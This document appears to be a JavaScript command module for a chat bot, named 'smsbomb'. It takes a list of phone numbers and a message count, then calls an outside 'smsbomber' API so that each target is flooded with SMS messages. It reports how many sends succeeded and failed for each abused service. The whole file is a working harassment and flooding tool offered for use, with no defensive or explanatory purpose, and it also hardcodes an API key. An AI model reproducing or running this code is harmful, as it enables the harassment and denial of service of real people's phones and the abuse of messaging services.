const axios = require("axios");

module.exports = {
  config: {
    name: "smsbomb",
    version: "2.0",
    role: 1, // Admin only (change to 0 for public use)
    countDown: 60,
    guide: {
      en: "smsbomb <phone1,phone2,...> <amount>"
    }
  },

  async execute({ api, event, args }) {
    const [phoneList, amountStr] = args;

    if (!phoneList || !amountStr || isNaN(amountStr)) {
      return api.sendMessage(
        "📱 Usage: smsbomb <phone1,phone2,...> <amount>\nExample: smsbomb 09XXXXXXXXX,09YYYYYYYYY 10",
        event.threadID,
        event.messageID
      );
    }

    const phones = phoneList.split(",").map(p => p.trim()).filter(p => p !== "");
    const amount = parseInt(amountStr);
    const apiKey = "b4d62c41ceb8af172f8f592bea566cb441c4e541c37915d04169cca7c5ee675f";

    let responseMessage = `💥 Starting SMS Bomb for ${phones.length} number(s)...\nEach will receive ${amount} messages.\n\n`;

    const messageID = await api.sendMessage(responseMessage + "⏳ Please wait...\n", event.threadID);

    let finalReport = "📊 SMS Bomb Results:\n";

    for (let i = 0; i < phones.length; i++) {
      const phone = phones[i];
      const progress = `Progress: [${'█'.repeat(i + 1)}${'░'.repeat(phones.length - i - 1)}] (${i + 1}/${phones.length})`;

      await api.sendMessage(progress, event.threadID, messageID.messageID);

      try {
        const res = await axios.get("https://haji-mix-api.gleeze.com/api/smsbomber", {
          params: {
            phone,
            amount,
            api_key: apiKey
          }
        });

        const data = res.data;

        if (!data.status) {
          finalReport += `❌ ${phone}: Failed (${data.message || "Unknown error"})\n`;
          continue;
        }

        const { total_success, total_failed, services } = data.details;

        finalReport += `📱 ${phone}:\n✅ Success: ${total_success} | ❌ Failed: ${total_failed}\n`;

        for (const [svc, res] of Object.entries(services)) {
          finalReport += `  └ ${svc}: ✅ ${res.success} | ❌ ${res.failed}\n`;
        }

        finalReport += "\n";

      } catch (err) {
        console.error(`❌ Error bombing ${phone}:`, err.message);
        finalReport += `❌ ${phone}: API error\n`;
      }
    }

    await api.sendMessage(finalReport, event.threadID, messageID.messageID);
  }
};
